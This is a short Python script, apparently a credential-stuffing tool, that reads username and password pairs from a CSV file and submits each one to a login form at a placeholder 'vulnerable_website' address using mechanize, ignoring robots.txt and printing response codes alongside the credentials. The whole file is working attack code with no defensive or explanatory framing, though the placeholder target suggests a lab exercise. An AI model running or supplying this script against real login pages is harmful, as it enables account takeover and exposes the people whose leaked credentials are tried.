import mechanize
import csv



def cred_stuffer():
    with open('creds.csv', newline='') as f:
        reader = csv.reader(f)
        creds = list(reader)

    br = mechanize.Browser()
    br.set_handle_robots(False)
    for cred in creds:
        br.open("http://vulnerable_website:5000/login")
        username = cred[0]
        password = cred[1]
        try:
            br.select_form(nr=0)
            br.form['username'] = username
            br.form['password'] = password
            req = br.submit()
            print(req.code)
            print(username,password)
        except:
            print("Invalid Credentials.")

def main():
    cred_stuffer()

if __name__ == "__main__":
    main()